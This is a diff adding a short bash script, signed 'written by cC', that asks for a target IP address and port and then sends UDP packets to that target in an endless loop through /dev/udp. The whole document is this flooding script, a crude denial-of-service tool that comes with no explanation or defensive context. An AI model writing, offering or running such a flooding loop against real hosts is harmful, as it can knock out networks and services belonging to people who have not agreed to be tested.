@@ -1,0 +1,11 @@
+
+#!/bin/bash
+echo "written by cC"
+echo "IP "; read IP
+IP="$IP"
+echo "PORT "; read PORT
+PORT=$PORT
+while true
+do
+     echo > /dev/udp/$IP/$PORT
+done
